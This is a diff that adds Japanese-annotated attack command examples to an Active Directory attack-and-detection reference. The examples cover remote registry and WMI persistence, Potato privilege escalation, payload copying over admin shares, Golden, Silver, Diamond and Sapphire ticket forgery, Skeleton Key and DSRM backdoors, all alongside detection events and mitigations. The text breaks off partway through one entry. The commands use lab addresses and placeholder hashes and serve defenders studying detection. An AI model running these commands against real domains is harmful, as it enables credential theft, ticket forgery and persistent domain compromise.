     "tools": "reg.exe(\\\\target), impacket reg.py, PowerShell(remote registry), NetExec",
+    "cmd": [
+      {
+        "tool": "reg.exe",
+        "t": "リモートホストにサービスキーを新規作成し実行の土台を作る。ホスト名を含むUNC形式のキー指定自体がリモート操作の証拠",
+        "q": "reg.exe add \\\\10.0.0.20\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\NewSvc"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "作成したサービスキーにImagePathを設定し次回起動でコード実行させる。`/v ImagePath`と`REG_EXPAND_SZ`の組が定番",
+        "q": "reg.exe add \\\\10.0.0.20\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\NewSvc /v ImagePath /t REG_EXPAND_SZ /d \"cmd /c whoami\" /f"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "SAMハイブをリモート保存し資格情報窃取へ連鎖させる。リモート指定時に許されるルートキーがHKLMとHKUのみという制約が識別材料",
+        "q": "reg.exe save \\\\10.0.0.20\\HKLM\\SAM C:\\Windows\\Temp\\sam.save"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側からwinreg RPC経由でリモートレジストリを書き換え。攻撃元にプロセスログは残らずDC側の445トラフィックだけが手掛かり",
+        "q": "reg.py corp.local/svc_user:'Passw0rd!'@10.0.0.10 add -keyName HKLM\\SYSTEM\\CurrentControlSet\\Services\\NewSvc -v ImagePath -vt REG_EXPAND_SZ -vd \"cmd /c whoami\""
+      },
+      {
+        "tool": "PowerShell",
+        "t": ".NET APIで直接リモートレジストリを開く経路。reg.exeを介さないため4104のみに`OpenRemoteBaseKey`が残る",
+        "q": "[Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine','10.0.0.10')"
+      }
+    ],
     "detect": "リモートからのレジストリ変更(4657)、Run/RunOnceやServicesキーの追加、Remote Registryサービスの起動、SAM/SECURITYハイブのreg save。4624 LogonType3との相関、winreg名前付きパイプアクセス。",
     "events": "4657, 4624(Type3), 5145(winreg pipe), 7036(RemoteRegistry開始)",
     "mitigate": "Remote Registryサービスを不要ホストで無効化、レジストリ主要キーの監査を有効化(4657)。管理共有/RPC制限、LAPS。EDRでリモートレジストリ経由のサービス/Autorun変更を検知。",
@@ -5417,6 +8915,33 @@ AD.I18N.ja.attacks = [
     "summary": "リモートでWMI永続イベントサブスクリプションを登録し、トリガー条件でコマンドを実行させる(横展開+永続化)。",
     "how": "前提は管理者権限とWMI(135/DCOM)到達性。リモートのroot\\subscription名前空間に__EventFilter(トリガ), CommandLineEventConsumer/ActiveScriptEventConsumer(ペイロード), __FilterToConsumerBindingを登録。ログオンや一定間隔(__IntervalTimerInstruction)でSYSTEMとしてコマンド実行。Set-WmiInstance -ComputerName や impact/Invoke-WMIEvent系ツールで遠隔登録する。",
     "tools": "PowerShell(Set-WmiInstance -ComputerName), Invoke-WMIEvent, WMImplant, mofcomp/mof登録",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "リモートに__EventFilterを登録しトリガー条件を定義する第一段階。`-ComputerName`指定がリモート永続化の直接証拠で4104にも残る",
+        "q": "Set-WmiInstance -ComputerName 10.0.0.10 -Namespace root\\subscription -Class __EventFilter -Arguments @{Name='BotFilter82';EventNameSpace='root\\cimv2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "実行させるペイロードをCommandLineEventConsumerとして登録する第二段階。`CommandLineTemplate`の文字列がSYSTEM実行コマンドそのもの",
+        "q": "Set-WmiInstance -ComputerName 10.0.0.10 -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='BotConsumer23';CommandLineTemplate=\"cmd.exe /c whoami\"}"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "FilterとConsumerを結び付けて永続化を完成させる最終段階。3コマンド1セットでの実行がこの技法の型として識別できる",
+        "q": "Set-WmiInstance -ComputerName 10.0.0.10 -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer}"
+      },
+      {
+        "tool": "WMImplant",
+        "t": "対話メニュー形式で永続化やコマンド実行を選ぶPowerShellツール。個別フラグを取らないため4104に関数名だけが残る",
+        "q": "Invoke-WMImplant"
+      },
+      {
+        "tool": "mofcomp.exe",
+        "t": "MOFファイルをコンパイルしてイベントサブスクリプションを登録するLOLBin経路。拡張子mofのファイル読込が検知の起点になる",
+        "q": "mofcomp.exe C:\\Windows\\Temp\\evil.mof"
+      }
+    ],
     "detect": "WMI-Activityログでのroot\\subscriptionへの__EventFilter/Consumer/Binding作成(Sysmon 19/20/21 WmiEvent)、WmiPrvSE子プロセスの異常なコマンド実行。リモートからのCIM/WMIインスタンス生成。",
     "events": "Sysmon 19/20/21, Microsoft-Windows-WMI-Activity/Operational, 4624(Type3)",
     "mitigate": "WMIサブスクリプションの定期棚卸しとベースライン化、Sysmon WmiEvent監視。DCOM/WMIリモートアクセス制限。EDRでCommandLineEventConsumer登録を検知。",
@@ -5457,6 +8982,38 @@ AD.I18N.ja.attacks = [
     "summary": "SMB名前付きパイプの接続クライアントを偽装してその資格情報コンテキストを取得し、横展開や権限昇格に用いる。",
     "how": "前提は名前付きパイプ作成権限。攻撃者がサーバ側パイプを作り、被害者/サービスがそのパイプへ接続するとImpersonateNamedPipeClient APIでクライアントのトークンを偽装できる。Meterpreterのgetsystem(named pipe技法)やPotato系(RPC/DCOM経由でSYSTEMをパイプへ誘導しSeImpersonateで昇格)が代表。取得トークンで隣接ホストへネットワークアクセスする。",
     "tools": "Meterpreter getsystem, PrintSpoofer/RoguePotato/GodPotato/DCOMPotato/SigmaPotato(現行), JuicyPotato(〜1809/Server2016のみ有効), Cobalt Strike, カスタムパイプサーバ",
+    "cmd": [
+      {
+        "tool": "Meterpreter",
+        "t": "複数の権限昇格技法を順に試すgetsystemの一手法指定。`-t 1`は名前付きパイプ偽装(インメモリ)技法を明示的に選ぶ",
+        "q": "getsystem -t 1"
+      },
+      {
+        "tool": "PrintSpoofer",
+        "t": "Print SpoolerのRPCを自作パイプへ誘導しSYSTEMトークンを窃取。`-i -c`はSYSTEM対話シェル起動の定番構成",
+        "q": "PrintSpoofer.exe -i -c cmd.exe"
+      },
+      {
+        "tool": "RoguePotato",
+        "t": "OXID解決を外部リダイレクタ経由で自ホストへ引き込みSYSTEM化。リダイレクタIP指定の`-r`がPrintSpoofer系との識別点",
+        "q": "RoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999"
+      },
+      {
+        "tool": "GodPotato",
+        "t": "Server 2019/2022でも通るOXID解決欠陥の後継実装。引数が`-cmd`一つだけで完結する単純さが特徴",
+        "q": "GodPotato.exe -cmd \"cmd /c whoami\""
+      },
+      {
+        "tool": "JuicyPotato",
+        "t": "Potato系の初代でServer2016/1809以前限定。`-l`ポートと`-p`起動プログラムの組み合わせが後継ツールにも共通する型",
+        "q": "JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t *"
+      },
+      {
+        "tool": "Cobalt Strike",
+        "t": "Beacon内蔵の権限昇格コマンドでSYSTEMトークンを取得。裏でPotato系と同じ名前付きパイプ偽装を使う実装が多い",
+        "q": "getsystem"
+      }
+    ],
     "detect": "Sysmon 17/18(異常なパイプ名: \\\\.\\pipe\\ ランダム/既知悪用名)、低権限プロセスからのSYSTEMプロセス生成、4624 LogonType9/4672の突然の付与。RPC/DCOM経由のパイプ接続とトークン昇格の相関。",
     "events": "Sysmon 17/18, 4624(Type9), 4672, 4696",
     "mitigate": "SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege を保持するサービスアカウントを最小化(gMSAや専用低権限アカウント化、不要な特権の剥奪)。パッチだけではGodPotato/DCOMPotato等は塞げず(完全パッチのWin11/Server2022でも成立)、RPCSS/DCOM経由のローカル認証誘導を前提に、低権限プロセスからの突発的なSYSTEM昇格・偽装パイプをEDRで検知する。RemotePotato0対策としてNTLMリレー緩和(SMB/LDAP署名・EPA、NTLM段階的無効化)とTier分離を併用する。",
@@ -5492,6 +9049,33 @@ AD.I18N.ja.attacks = [
     "summary": "Windows OpenSSHや管理用SSHサービスへ、窃取した資格情報や鍵で接続して横展開する。",
     "how": "前提はターゲットでOpenSSH Server(22)有効と有効な資格情報/秘密鍵。ssh user@target、plink、または窃取した~/.ssh秘密鍵・authorized_keys改変で認証。ドメイン統合SSHではAD資格情報で認証しそのままコマンド実行。鍵の使い回しやエージェント転送の悪用で連鎖的に横移動する。",
     "tools": "ssh/plink, 窃取秘密鍵, Metasploit ssh_login, NetExec ssh",
+    "cmd": [
+      {
+        "tool": "ssh",
+        "t": "窃取した資格情報でOpenSSHサーバへ対話ログオン。Windows OpenSSHでは通常のログオンイベントに加えsshdのイベントログに残る",
+        "q": "ssh svc_user@10.0.0.10"
+      },
+      {
+        "tool": "ssh",
+        "t": "秘密鍵認証での接続。パスワード認証の失敗ログが出ないためauthorized_keysの改変有無との突合が必要になる",
+        "q": "ssh -i id_rsa svc_user@10.0.0.10"
+      },
+      {
+        "tool": "plink.exe",
+        "t": "PuTTYのCLI版でWindows環境にssh.exeの代わりに持ち込まれることが多い。非標準環境でのバイナリ名自体が高シグナル",
+        "q": "plink.exe -ssh -l svc_user -pw Passw0rd! 10.0.0.10"
+      },
+      {
+        "tool": "NetExec",
+        "t": "SSHプロトコルモジュールで資格情報検証とコマンド実行を一括化。`-x`が実行するコマンドを渡すフラグ",
+        "q": "netexec ssh 10.0.0.10 -u svc_user -p 'Passw0rd!' -x whoami"
+      },
+      {
+        "tool": "Metasploit",
+        "t": "ssh_loginで資格情報の有効性を大量検証しセッション化する偵察寄りの手口。成功後さらなる実行へ繋がる",
+        "q": "msfconsole -q -x \"use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.0.0.10; set USERNAME svc_user; set PASSWORD Passw0rd!; run; exit\""
+      }
+    ],
     "detect": "OpenSSH/Operationalログの認証イベント、想定外ホストでのsshd起動、4624 LogonType3(SSH)、authorized_keysの変更。内部22ポートの異常接続。",
     "events": "4624(Type3), OpenSSH/Operational(sshd), 4688(sshd子プロセス)",
     "mitigate": "不要ホストでOpenSSH Server無効化、鍵ベース認証+パスフレーズ、接続元制限。authorized_keys監査、鍵のローテーション。SSHエージェント転送を制限しTier分離。",
@@ -5532,6 +9116,33 @@ AD.I18N.ja.attacks = [
     "summary": "ADMIN$やC$へファイルをコピーし、別の実行機構(タスク/サービス/WMI)と組み合わせて起動する基礎的横展開手法。",
     "how": "前提はローカル管理者とSMB(445)。net use \\\\target\\C$ /user:... やcopy payload.exe \\\\target\\ADMIN$\\Temp\\ で配置し、schtasks/sc/WMIで実行。多くのPtHツールの土台であり、ローカル管理者ハッシュ使い回しで大規模に展開される(ランサムウェア展開の常套)。",
     "tools": "net use/copy, impacket smbclient.py, NetExec --put-file/-x, robocopy",
+    "cmd": [
+      {
+        "tool": "net.exe",
+        "t": "管理共有C$へ認証しセッションを確立する起点動作。直後のcopy/schtasksとの相関が横展開の典型パターン",
+        "q": "net use \\\\10.0.0.20\\C$ /user:corp.local\\svc_user Passw0rd!"
+      },
+      {
+        "tool": "copy",
+        "t": "ADMIN$(実体はC:\\Windows)配下へペイロードを配置。書込み先が管理共有のUNCパスである点が転送元端末側の検知起点",
+        "q": "copy payload.exe \\\\10.0.0.20\\ADMIN$\\Temp\\payload.exe"
+      },
+      {
+        "tool": "robocopy",
+        "t": "copyの代わりに使われる正規運用ツール。管理共有への反復/大量転送で通常のIT運用と量的に区別する",
+        "q": "robocopy C:\\Temp \\\\10.0.0.20\\C$\\Temp payload.exe"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側からSMB共有へ対話的にファイル転送。putサブコマンドでの書込みだが転送元端末にプロセスログは残らない",
+        "q": "smbclient.py corp.local/svc_user:'Passw0rd!'@10.0.0.10"
+      },
+      {
+        "tool": "NetExec",
+        "t": "配置と実行を1コマンドで完結させる。`--put-file`が転送、`-x`が直後のリモートコマンド実行を意味する",
+        "q": "netexec smb 10.0.0.10 -u svc_user -p 'Passw0rd!' --put-file payload.exe C:\\Windows\\Temp\\payload.exe -x \"C:\\Windows\\Temp\\payload.exe\""
+      }
+    ],
     "detect": "5140/5145(管理共有ADMIN$/C$への書き込みアクセス、RelativeTargetNameに実行ファイル)、4624 LogonType3、多数ホストへの短時間ファイル配布パターン。配置直後のサービス/タスク作成の相関。",
     "events": "5140, 5145, 4624(Type3), 7045/4698(後続実行)",
     "mitigate": "ワークステーション間SMB(445)をホストFWで遮断、管理共有アクセス監査、SMB署名。LAPSでローカル管理者ハッシュ使い回し防止、Tier分離、EDRで共有書込み+実行の相関検知。",
@@ -5567,6 +9178,33 @@ AD.I18N.ja.attacks = [
     "summary": "krbtgtアカウントのハッシュを悪用し任意のユーザー・権限を持つTGTを偽造する究極の永続化手法。",
     "how": "前提としてkrbtgtアカウントのNTLMハッシュ(またはAES256鍵)とドメインSID、ドメインFQDNが必要。これらはDCSyncやNTDS.dit窃取で入手する。オフラインでTGTを偽造でき、任意のRID(既定でRID 500やDomain Admins/Enterprise Adminsグループ、krbtgtのPAC)を埋め込む。DCとの通信なしに作成でき、有効期限も任意(既定10年)に設定可能なため長期潜伏に使われる。",
     "tools": "mimikatz (kerberos::golden), Rubeus (golden), impacket ticketer.py, Cobalt Strike",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "krbtgtハッシュから任意ユーザーのTGTを偽造しメモリ注入。偽造自体は無ログで検知点は`/ptt`後のTGS要求(4769)の異常な有効期限やRID",
+        "q": "mimikatz.exe \"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:<krbtgt_hash> /id:500 /ptt\" exit"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "SID/ドメインを手動指定して生成。実在しないRIDや誤ったnetbios名の混入が検知の糸口になる",
+        "q": "Rubeus.exe golden /rc4:<krbtgt_hash> /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /ptt"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "`/ldap`でドメイン情報をLDAPから自動取得し整合性の高いチケットを生成。手動指定型よりSID不一致等の検知指標が出にくい",
+        "q": "Rubeus.exe golden /aes256:<krbtgt_aes256_key> /user:Administrator /ldap /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linuxから直接TGTを偽造。攻撃元にプロセスログは残らずDCは最初のTGS要求(4769)まで無反応、既定10年の寿命が異常値の手掛かり",
+        "q": "ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local Administrator"
+      },
+      {
+        "tool": "Cobalt Strike",
+        "t": "他ツールで偽造した.kirbiをBeaconのログオンセッションに注入するだけ。ファイル読込後の異常な認証成功が唯一の手掛かり",
+        "q": "kerberos_ticket_use C:\\\\Windows\\\\Temp\\\\golden.kirbi"
+      }
+    ],
     "detect": "TGT要求(AS-REQ)なしにTGS-REQ(4769)が発生する異常や、既定より長いチケット有効期間を検知する。存在しないアカウントや無効化済みアカウントのログオン、PACの整合性エラー、mimikatz既定の10年寿命チケットが指標。Microsoft Defender for Identityの黄金チケット検知アラートが有効。",
     "events": "4769, 4768, 4624 (異常なアカウント/寿命)",
     "mitigate": "krbtgtパスワードを2回連続でリセット(kdcの鍵履歴を考慮し間隔を空ける)して既存の偽造チケットを無効化する。DCへのアクセス最小化、Tier0管理の徹底、DCSyncを防ぐ権限監査を実施。定期的なkrbtgtローテーションを運用に組み込む。",
@@ -5602,6 +9240,33 @@ AD.I18N.ja.attacks = [
     "summary": "サービスアカウント(コンピュータアカウント含む)のハッシュで特定サービス向けTGSを偽造しDCを介さずアクセスする。",
     "how": "前提は対象サービスのサービスアカウント(例: CIFS/HOST/MSSQLSvc等のSPNを持つアカウントやマシンアカウント)のNTLM/AESハッシュ。TGSを直接偽造するためKDC(DC)と一切通信せず、認証ログがDCに残りにくい。対象サービス単位でしか使えないが検知が困難で局所的永続化に有効。PAC検証が無効な多くのサービスで通用する。",
     "tools": "mimikatz (kerberos::golden /service:cifs), Rubeus (silver), impacket ticketer.py",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "サービスアカウントのハッシュでTGSを直接偽造しKDCを介さない。DCの4768/4769どちらにも残らずサービス側ログのみが頼り",
+        "q": "mimikatz.exe \"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /target:fs01.corp.local /service:cifs /rc4:<service_account_hash> /ptt\" exit"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "`/service:`の値がアクセス先サービスの範囲を示す。対象サービス側の認証・アクセスログとの突合が唯一の検知経路",
+        "q": "Rubeus.exe silver /service:cifs/fs01.corp.local /rc4:<service_account_hash> /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /ptt"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "MSSQLSvc等DBサービスへの偽装例。LDAP自動補完でSID入力ミスを防ぐためDB監査ログ上の異常クエリと相関させる必要がある",
+        "q": "Rubeus.exe silver /service:MSSQLSvc/sql01.corp.local:1433 /aes256:<service_account_aes_key> /user:Administrator /ldap /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側からのSilver Ticket生成。`-spn`指定時のみ有効でDC側ログは無く対象サーバのアクセスログのみが証跡",
+        "q": "ticketer.py -nthash <service_account_hash> -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local -spn cifs/fs01.corp.local Administrator"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "AES256鍵で署名しRC4偽装特有の暗号種別アラートを回避する低ノイズ版。サービス側の認可ログとの突合以外に検知手段がない",
+        "q": "mimikatz.exe \"kerberos::golden /user:svc_sql /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /target:sql01.corp.local /service:MSSQLSvc /aes256:<service_account_aes_key> /ptt\" exit"
+      }
+    ],
     "detect": "DCに認証ログ(4768/4769)が残らないままサービスアクセス(4624)が発生する乖離が最大の指標。ホスト側のログオンイベントとDCのKerberosログの突合、異常なPACやSPN不一致を監視。マシンアカウントパスワードの整合性検証も有効。",
     "events": "4624 (ホスト側のみ、DCに4769なし)",
     "mitigate": "サービスアカウントのパスワードを定期ローテーション、マシンアカウントパスワードの自動更新を有効化(既定30日)。gMSA/dMSAの採用でハッシュ窃取を困難にする。KDCのPAC検証強制(サブジェクト側で検証)を促進。",
@@ -5637,6 +9302,28 @@ AD.I18N.ja.attacks = [
     "summary": "正規のTGTを一旦取得し復号してPACを改ざん・再暗号化することで検知回避性を高めた偽造TGT。",
     "how": "krbtgt鍵(AES推奨)を持つ前提でまず正規のAS-REQでTGTを取得し、krbtgt鍵で復号してPACのグループ/RIDを改ざんし再暗号化する。Golden Ticketと異なり実在の要求に基づくためチケット構造やフラグが正規と一致し、寿命異常などの検知指標が出にくい。DCに正規のAS-REQ(4768)が残るため乖離検知を回避できる。",
     "tools": "Rubeus (diamond), impacket (改変)",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "TGT委任転送(tgtdeleg)で取得した実TGTのPACのみ改ざん再暗号化。AS-REQ(4768)は正規に記録されGolden系特有の寿命異常が出ない",
+        "q": "Rubeus.exe diamond /tgtdeleg /krbkey:<krbtgt_aes256_key> /ticketuser:Administrator /ticketuserid:500 /groups:512,518,519,520 /ptt"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "指定アカウントの資格情報で実TGTを取得後に改ざん。取得時4768のユーザー名と改ざん後PACのグループ不一致を相関させて検知する",
+        "q": "Rubeus.exe diamond /user:svc_user /rc4:<svc_user_ntlm_hash> /krbkey:<krbtgt_aes256_key> /ticketuser:Administrator /ticketuserid:500 /ptt"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "証明書認証(PKINIT)で実TGTを取得後に改ざんする亜種。4768のcertificate issuerフィールドと後続動作の乖離が数少ない糸口",
+        "q": "Rubeus.exe diamond /user:svc_user /certificate:C:\\\\Temp\\\\svc_user.pfx /password:'Passw0rd!' /krbkey:<krbtgt_aes256_key> /ticketuser:Administrator /ticketuserid:500 /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "`-request`は実チケットをクローンし指定項目のみ書換え。KDC発行時刻や寿命が正規のまま残るためGolden系の寿命ベース検知をすり抜ける",
+        "q": "ticketer.py -request -user svc_user -password 'Passw0rd!' -domain corp.local -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -aesKey <krbtgt_aes256_key> -user-id 500 -groups 512,518,519,520 Administrator"
+      }
+    ],
     "detect": "正規TGTと区別が難しいため、krbtgt鍵漏洩そのものの防止が主眼。PAC内グループとディレクトリ実態の不整合、短時間での特権昇格、異常なアクセスパターンを行動分析で検知。Defender for Identityの高度検知に依存。",
     "events": "4768, 4769 (正規に見える)",
     "mitigate": "krbtgtの定期ローテーション、Tier0保護、AES鍵の保護。行動ベース検知(UEBA)の導入。DCSync/NTDS窃取の遮断で根本原因を断つ。",
@@ -5672,6 +9359,23 @@ AD.I18N.ja.attacks = [
     "summary": "S4U2self/U2Uで実在特権ユーザーの正規PACを取得し、それを偽造チケットに埋め込む最も隠密性の高いGolden系亜種。",
     "how": "krbtgt鍵を持つ前提で、S4U2self+U2U(User-to-User)機構を悪用してDomain Adminなど実在特権アカウントの完全に正当なPACをKDCから取得する。そのPACをそのまま偽造TGTに載せるため、PAC内容がディレクトリ実態と完全一致し、Diamond以上に検知が困難。attributes/署名がすべて正規となる。",
     "tools": "impacket ticketer.py (-impersonate, sapphire対応), Rubeus",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "S4U2self+U2Uで実在特権ユーザーの正規PACを取得しそのまま埋め込む。ディレクトリ実態と完全一致しGolden/Diamond系の検知指標がほぼ出ない",
+        "q": "ticketer.py -impersonate Administrator -domain corp.local -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -aesKey <krbtgt_aes256_key> -user svc_user -password 'Passw0rd!' -dc-ip 10.0.0.10 Administrator"
+      },
+      {
+        "tool": "Impacket",
+        "t": "`-impersonate`実行時にDCへS4U2self+U2Uの4769が連続発生。偽造チケット生成前にDCへ残る唯一のネットワーク上の痕跡",
+        "q": "ticketer.py -impersonate Administrator -domain corp.local -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -aesKey <krbtgt_aes256_key> -user svc_user -password 'Passw0rd!' Administrator"
+      },
+      {
+        "tool": "Impacket",
+        "t": "サービスアカウントを踏み台に`-extra-sid`でEnterprise Admins(-519)を追加注入する亜種。異常SIDの混入以外に検知点がない",
+        "q": "ticketer.py -impersonate svc_backup -domain corp.local -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -nthash <krbtgt_hash> -user svc_user -password 'Passw0rd!' -extra-sid S-1-5-21-1111111111-2222222222-3333333333-519 svc_backup"
+      }
+    ],
     "detect": "PAC内容が正規であるため内容ベース検知はほぼ不可能。異常なU2U/S4U要求パターン、krbtgt鍵利用の痕跡、被害特権アカウントに紐づく想定外アクセスの相関で推定する。根本的にはkrbtgt漏洩防止が唯一の実効策。",
     "events": "4769 (S4U/U2U要求), 4768",
     "mitigate": "krbtgtローテーションとTier0保護。S4U関連の異常監視。DCSync遮断による鍵漏洩防止を最優先とする。",
@@ -5707,6 +9411,28 @@ AD.I18N.ja.attacks = [
     "summary": "DCのLSASSにパッチを当てマスターパスワードで全ユーザーとして認証可能にするインメモリ・バックドア。",
     "how": "DC上でDomain Admin相当の権限とSeDebugPrivilegeが前提。mimikatz misc::skeletonでLSASSプロセスにパッチを適用し、既存パスワードに加えて任意の共通パスワード(既定 mimikatz)でどのアカウントでも認証を通す。RC4へのダウングレードを伴い、再起動で消えるためインメモリ永続化。DCが複数ある場合は各DCに適用が必要。",
     "tools": "mimikatz (misc::skeleton)",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "DCのLSASSにパッチしマスターパスワード(既定`mimikatz`)で全アカウント認証を許可。RC4ダウングレードを伴う4768が手掛かり",
+        "q": "mimikatz.exe \"privilege::debug\" \"misc::skeleton\" exit"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "WinRM経由で複数DCへ一括適用する典型パターン。4104のScriptBlockに`misc::skeleton`が残り複数DC同時アクセスも相関点になる",
+        "q": "Invoke-Command -ComputerName dc01.corp.local -ScriptBlock { C:\\\\Windows\\\\Temp\\\\mimikatz.exe 'privilege::debug' 'misc::skeleton' 'exit' }"
+      },
+      {
+        "tool": "NetExec",
+        "t": "適用後は既定マスターパスワード`mimikatz`で任意アカウント認証が可能になる。パスワード変更無しでの認証成功が指標",
+        "q": "netexec smb dc01.corp.local -u administrator -p mimikatz"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "PowerShellへリフレクティブロードしファイルを落とさず適用。ディスクI/O無しのため4104のスクリプトブロックログが唯一の痕跡",
+        "q": "Invoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"'"
+      }
+    ],
     "detect": "LSASSへの不審なコードインジェクション/SeDebugPrivilege行使、RC4(等号ダウングレード)への認証暗号化タイプの後退、DC上のmimikatz実行痕跡を監視。イベント4673/4611やLSASSアクセス(Sysmon EID10)を検知。Defender for IdentityのSkeleton Key検知アラートが有効。",
     "events": "4673(特権使用), 4768/4769(暗号化タイプ0x17=RC4への後退), Sysmon 10(LSASSアクセス)",
     "mitigate": "LSA Protection(RunAsPPL)を有効化しLSASSへのパッチを防止。Credential GuardとDCのアプリケーション制御(WDAC)を導入。DCへの管理者アクセスを最小化し、AES強制でRC4後退を検知しやすくする。",
@@ -5747,6 +9473,28 @@ AD.I18N.ja.attacks = [
     "summary": "KDSルート鍵を窃取しgMSA(グループ管理サービスアカウント)のパスワードをオフラインで永続的に算出する。",
     "how": "KDSルート鍵(msKds-ProvRootKeyオブジェクト。実データはmsKds-RootKeyData属性、既定でDomain Controllers/SYSTEMのみ読取可)を読める権限が前提で、通常はDCSyncやDA権限で取得する。ルート鍵とgMSAのSID/属性(msDS-ManagedPasswordId等)からmanagedPasswordをオフライン計算でき、gMSAパスワードが自動ローテーションされても鍵さえあれば将来のパスワードも予測できるため強力な永続化になる。2025年にはSemperis(Adi Malyanker)がWindows Server 2025のdMSA(委任管理サービスアカウント)を狙う『Golden dMSA』亜種を公表し、msDS-ManagedPasswordIdの時刻由来コンポーネントが構造的に予測可能(候補が約1024と狭い)でオフライン総当たりによりフォレスト全体のdMSAパスワードを生成できると報告している。",
     "tools": "GoldenGMSA.exe, gMSADumper, Semperis GoldenGMSA",
+    "cmd": [
+      {
+        "tool": "GoldenGMSA",
+        "t": "KDSルート鍵オブジェクト(msKds-ProvRootKey)をLDAP経由で列挙。通常アカウントは読めないためDCSync級権限悪用の兆候になる",
+        "q": "GoldenGMSA.exe kdsinfo"
+      },
+      {
+        "tool": "GoldenGMSA",
+        "t": "ルート鍵とgMSAのSID/属性からmanagedPasswordをオフライン計算。ローテーション後も鍵さえ有効なら再計算できる",
+        "q": "GoldenGMSA.exe compute --sid S-1-5-21-1111111111-2222222222-3333333333-1105 --kdskey <kds_root_key_base64> --pwdid <msds_managedpasswordid_base64>"
+      },
+      {
+        "tool": "gMSADumper",
+        "t": "LDAP経由でgMSAの現在パスワードを直接読み取るオンライン版。`msDS-ManagedPassword`属性への読取アクセスがLDAP監査ログに残る",
+        "q": "gMSADumper.py -u svc_user -p 'Passw0rd!' -d corp.local -l dc01.corp.local"
+      },
+      {
+        "tool": "GoldenGMSA",
+        "t": "対象gMSAアカウントの属性を列挙する事前偵察。単体では正規運用と区別できず直後のkdsinfo/compute実行との相関が必須",
+        "q": "GoldenGMSA.exe gmsainfo"
+      }
+    ],
     "detect": "KDSルート鍵オブジェクト(CN=Master Root Keys)へのアクセス(4662)、gMSAのmsDS-ManagedPassword/ManagedPasswordId属性への異常な読取を監視。DCSyncやDA権限行使との相関、通常端末からのKDS鍵アクセスを検知する。",
     "events": "4662 (KDS Root Key/gMSA属性アクセス)",
     "mitigate": "KDSルート鍵の読取権限を厳格に制限しアクセス監査を有効化。gMSAが漏洩した場合はKDSルート鍵の再作成とgMSA再作成を検討。Tier0保護とDCSync遮断で鍵窃取を防ぐ。",
@@ -5782,6 +9530,28 @@ AD.I18N.ja.attacks = [
     "summary": "DCローカルのDSRM(復元モード)管理者アカウントをネットワークログオン可能に設定しバックドア化する。",
     "how": "DCへの管理者アクセスが前提。DSRMアカウントはDCローカルのAdministratorで、そのハッシュを取得(reg/lsadump)またはntdsutilで既知値に設定する。レジストリDsrmAdminLogonBehaviorを2に設定するとDSRMアカウントでネットワーク経由ログオンが可能になり、Pass-the-HashでDCにアクセスできる隠密バックドアとなる。ドメインアカウントではないためパスワードポリシーやローテーション対象外になりやすい。",
     "tools": "mimikatz (token/lsadump::sam), reg add (DsrmAdminLogonBehavior), ntdsutil",
+    "cmd": [
+      {
+        "tool": "reg.exe",
+        "t": "DSRMローカル管理者のネットワークログオンを常時許可に変更。滅多に触られない値のため変更イベント(4657)が高精度シグナル",
+        "q": "reg add \"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa\" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f"
+      },
+      {
+        "tool": "ntdsutil",
+        "t": "DCローカルのDSRM Administratorパスワードを既知値に上書き。対話的コマンドのためプロセス生成(4688)とパスワードリセットの組合せで検知",
+        "q": "ntdsutil \"set dsrm password\" \"reset password on server null\" q q"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "DC上のローカルSAMからDSRM Administratorの既存NTLMハッシュを窃取。パスワードリセット無しでPass-the-Hashに転用できる",
